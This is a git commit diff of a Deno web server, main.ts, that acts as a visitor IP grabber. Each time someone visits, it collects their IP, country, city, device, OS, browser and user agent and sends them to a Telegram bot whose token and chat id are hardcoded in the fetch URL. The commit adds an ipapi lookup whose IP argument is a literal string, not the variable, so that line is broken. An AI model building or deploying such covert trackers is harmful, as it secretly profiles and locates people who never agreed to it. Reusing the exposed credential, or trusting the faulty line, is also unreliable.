0861ac80e97702b0bcc98a60970dc8973295b832
MOAYAD <101659441+MOA-YAD@users.noreply.github.com>
2024-03-30 13:06:07 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -1,6 +1,7 @@
 import { Application, Router } from "https://deno.land/x/oak/mod.ts";
 import userAgent from 'https://deno.land/x/user_agent@v0.1.4/mod.ts';
 import { getIPLocation } from "https://deno.land/x/ip_location/mod.ts";
+import ipapi from 'https://deno.land/x/ipapi/mod.js'
 import * as emoji from "https://deno.land/x/emoji/mod.ts";
 
 const app = new Application();
@@ -21,6 +22,7 @@ router.get("/", async (ctx) => {
   const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
   const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
   console.log(info)
+  console.log(await ipapi('${ip}', 'en'))
    await fetch(
     `https://api.telegram.org/bot6823782631:AAFbVnSSQYMnkct09VWaZic6_wnuCW-L1ps/sendMessage?chat_id=1495309346&text=${iptext}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${countryinfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${cityInfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${browser_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_os}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${userAgentString_v}&parse_mode=markdown`,
    );
